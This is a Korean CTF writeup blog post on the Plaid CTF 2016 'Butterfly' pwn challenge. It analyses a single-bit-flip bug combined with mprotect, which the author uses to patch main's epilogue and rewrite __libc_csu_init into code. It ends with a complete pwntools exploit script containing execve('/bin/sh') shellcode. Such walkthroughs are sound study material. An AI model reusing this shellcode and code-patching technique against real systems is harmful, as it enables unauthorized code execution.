---
layout: post
title: "PCTF 2016 - Butterfly"
date: 2017-11-16 +0900
author: "JaeHyuk Lim"
categories: [ctf, pwn]
tags: [ctf, pwn, exploit]
---
## I. 개요
 사실 얼마전부터 후이즈 블로그를 개설하게 되면서, 문제를 하나씩 풀어보면서 마크다운, 깃허브io 사용법을 익힐겸, 라이트업을 작성하기로 결정했다.<br />
 그에 대한 첫 번째 라이트업은 바로 Plaid CTF 2016의 Butterfly라는 문제!!<br />
 일단 문제 자체가 어렵거나 그런건 아니지만, 참신하게 접근할 수 있어서 작성해본다.<br />

## II. 바이너리 분석 
  바이너리는 크게 어려운 것은 없다, 일단 다음 코드를 살펴보도록 하자.<br />
  ```C
  v11 = *MK_FP(__FS__, 40LL);
  setbuf(_bss_start, 0LL);
  puts("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?");
  v3 = 1;
  if ( fgets(&v10, 50, stdin) )
  {
    v4 = strtol(&v10, 0LL, 0);
    v5 = v4;
    v6 = (_BYTE *)(v4 >> 3);
    v7 = (void *)((v4 >> 3) & 0xFFFFFFFFFFFFF000LL);
    if ( mprotect(v7, 0x1000uLL, 7) )
    {
      perror("mprotect1");
    }
    else
    {
      v3 = 1;
      *v6 ^= 1 << (v5 & 7);
      if ( mprotect(v7, 0x1000uLL, 5) )
      {
        perror("mprotect2");
      }
      else
      {
        puts("WAS IT WORTH IT???");
        v3 = 0;
      }
    }
  }
  v8 = *MK_FP(__FS__, 40LL);
  if ( *MK_FP(__FS__, 40LL) == v11 )
    LODWORD(v8) = v3;
  return v8;
}
  ```

  어렵다기보다는 그냥 왜이렇게 코드가 짧음? 이라는 소리가 먼저나오는 코드이다.<br />
  일단, 프로그램의 흐름은 입력값을 fgets로 받고(그렇기 때문에 NULL바이트도 넣을 수 있다. 기억해둘 것) 이 값을 strtol()함수로 문자열을 정수로 바꾸는데, 이 함수는 뒤에 아무리 많은 문자열이 존재하더라도 숫자형태의 문자들만 정수형으로 치환해주기 때문에 뒤에는 값이 더들어갈 수 있다.<br />
  그리고 그렇게 바뀐 주소는 마지막 3비트가 Right Shift되고, 그 결과값을 기준으로 rwx(0x7) 권한으로 mprotect로 권한이 제어된다.<br />
  여기서 우리가 알아야할 점이 하나 있는데, <br />
  여기서 사용되는 마지막 3비트는 이후 1바이트를 xor하는데에 사용된다는 것을 명심해야 한다. <br />
  ```C
      v3 = 1;
      *v6 ^= 1 << (v5 & 7);
  ```
  이 부분을 보면 알 수 있듯이, 이전에 Right Shift를 해주었던 3비트는 7(0b111)을 AND연산해줌으로써 구할 수 있고, 이렇게 구해준 마지막 3비트가 1을 Left Shift를 해주는데 사용된다. 즉, 우리는 어떤 위치의 값을 바꾸어줄때 다음과 같은 연산을 할 수 있다는 뜻이 된다.<br /><br />

  만약 다음과 같은 비트열이 있다고 해보자.
  ```Python
  bin(ord('A')) == 0b1000001
  ```
  우리는 이 값을 소문자 'a'로 바꾸고 싶은 상황이다. 그렇다면 다음과 같이 바꿔줄 수 있다.<br />
  먼저 소문자 'a'를 바이너리로 나타내보자.<br />
  ```Python
  bin(ord('a')) == 0b1100001
  ```

  차이점이라고는 6번째 비트가 1로 바뀌었다는 정도이다. 그렇다면 우리는 xor의 특성을 이용해서 다음과 같은 방법으로 bit flip을 해줄 수 있다<br />
  ```C
       v3 = 1;
      *v6 ^= 1 << (v5 & 7);
  ```
  해당 코드에서 0b1000001이 0b1100001이 되기 위해서는 0b0100000이 xor되어야 한다.<br />
  그렇다면 우리는 여기서 1이 5만큼 좌측으로 Shift되어야하는 것을 알고 있다.<br />
  이를 마지막 3비트에 채워서 보내면 내가 원하는 메모리에 있는 대문자 'A'를 'a'로 바꾸도록 만들 수 있다.<br />

  이제 대충 취약점이 어떤식으로 동작하는지 알았으니까 익스플로잇을 진행할 때다.<br />
  이 코드를 잘 보도록 하자.
  ```C
  if ( mprotect(v7, 0x1000uLL, 7) )
  ...
  if ( mprotect(v7, 0x1000uLL, 5) )
  ...

  ```

  해당 코드의 mprotect는 현재 할당된 메모리의 실행 권한을 변경해주는 함수인데, 실행 권한에는 다음과 같은 녀석들이 있다.<br />
  PROT_NONE, PROT_READ, PROT_WRITE, PROT_EXEC, PROT_SEM, PROT_SAO ...<br />
  나도 몰랐던 권한이 정말 많다. 이중에서 우리가 알아야하는 녀석들은 PROT_READ, PROT_WRITE, PROT_EXEC 이 세가지이다.<br />

  여기서 PROT_WRITE는 쓰기 권한, PROT_READ는 읽기 원한을 의미하며, PROT_EXEC는 실행 권한을 의미한다.<br />
  일반적으로 실행권한은 rwx로 표현하며, 이렇게 3가지 권한이 할당되었을 때는 7으로 표현한다. 2진수 단위를 생각하면 편하다.<br />
  그렇다면 5라는 권한은 어떻게될까? 당연히 r-x라는 권한이 되며 이는 5를 의미한다.<br />

  여기서 mprotect를 이용해서 굳이 메모리 영역을 7로 권한을 조절해준 후, 다시 5로 바꿔주는 이유는 무엇일까?<br />
  그 이유는 바로 이 문제의 공격 방법에 있다.<br />
  실제로 프로그램 코드도 실행중인 프로세스의 가상 메모리 영역에 할당되어서 사용이 된다. 그렇기 때문에 코드 영역도 권한만 바꾸어준다면 WRITE권한을 가질수도 있게 된다.


  ```
  .text:0000000000400860                 add     rsp, 48h
.text:0000000000400864                 pop     rbx
.text:0000000000400865                 pop     r14
.text:0000000000400867                 pop     r15
.text:0000000000400869                 pop     rbp
.text:000000000040086A                 retn
  ```

  이 부분은 main함수의 끝 부분에 위치한 함수 에필로그 영역이다. (FTZ나 LOB를 해봤으면 에필로그가 무엇인지는 안다고 가정한다.)<br />
  해당 영역에서는 add rsp, 0x48을 통해서 이전에 사용된 메모리 영역을 다시 복구해주고 있는데, 여기서 0x48에 해당하는 OpCode를 1바이트 해당 취약점으로 수정함으로써, retn 명령이 실행되는 시점의 rsp 포인터를 우리가 입력해준 데이터가 들어있는 메모리로 바꿔줄 수 있다.<br />

  그리고 쓰기 권한을 부여하는 것이기 때문에 기존에 존재하는 메모리 영역을 바꾸는 것도 가능하다.<br />
  예를들면 다음과 같다.<br /><br />

  ```C
  void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r13@1
  __int64 v4; // rbx@1
  signed __int64 v5; // rbp@1

  v3 = a3;
  v4 = 0LL;
  v5 = &_do_global_dtors_aux_fini_array_entry - _frame_dummy_init_array_entry;
  init_proc();
  if ( v5 )
  {
    do
      ((void (__fastcall *)(_QWORD, __int64, __int64))_frame_dummy_init_array_entry[v4++])(a1, a2, v3);
    while ( v4 != v5 );
  }
}
  ```

  이 녀석은 _libc_csu_init이라는 함수인데, 프로그램이 시작해서 _start 함수로 진입하였을 때, main함수를 실행하기 이전에 처리해주는 함수 정도로 생각하면 되겠다. (정확한 역할은 나중에 설명하도록 하겠다.)<br />
  이 녀석도 쓰기권한이 기존에 없었을 뿐이지, 우리가 만약 mprotect로 실행권한을 바꿔준다면 해당 영역의 코드를 우리가 원하는 어셈블리로 패치하는 것도 가능해진다.<br />
  나는 이를 이용해서 해당 영역을 64bit ShellCode로 바꾸어주었고, Return Address를 해당 주소로 이동시켜서 쉘을 획득했다.<br />

  Exploit Code
  ```Python
  #!/usr/bin/python
from pwn import *

elf = ELF("./butterfly")
shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
with open("csu.bin", "rb") as f:
	csu = f.read()
csu_addr = elf.symbols['__libc_csu_init']

p = process("./butterfly")
print p.recvuntil("RAY?\n")

put = (0x400863 << 3) + 0x7
put1 = 33571614
payload = str(put1) + "A" * 32
payload += p64(0x400788)

put2 = (0x4007c5 << 3) + 0x1

p.sendline(payload)
print p.recvuntil("RAY?\n")

payload = str(put2) + "A" * 32
payload += p64(0x400788)
p.sendline(payload)
print p.recvuntil("RAY?\n")

for cnt in range(0, len(shell)):
    csu_byte = ord(csu[cnt])
    #print "[*] csu_bin : " + bin(csu_byte)
    shell_byte = ord(shell[cnt])
    #print "[*] shell_bin : " + bin(shell_byte)
    for i in range(8):
        bit_csu = csu_byte & (0x1 << i)
        if (bit_csu != (shell_byte & (0x1 << i))):
            payload = str(((csu_addr + cnt) << 3) | (i))
            payload += "A" * 32
            payload += p64(0x400788)
            p.sendline(payload)
            p.recvuntil("RAY?\n")

p.sendline("A" * 40 + p64(csu_addr))

p.interactive()
  ```